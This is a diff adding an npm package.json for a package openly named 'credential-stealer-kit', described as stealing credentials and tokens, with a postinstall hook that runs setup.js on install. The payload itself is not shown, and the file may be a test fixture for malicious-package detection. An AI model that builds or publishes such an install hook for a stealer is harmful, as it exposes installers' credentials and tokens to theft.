@@ -1,0 +1,12 @@
+{
+  "name": "credential-stealer-kit",
+  "version": "0.1.0",
+  "description": "Steals credentials and tokens",
+  "keywords": [
+    "stealer",
+    "malware"
+  ],
+  "scripts": {
+    "postinstall": "node setup.js"
+  }
+}
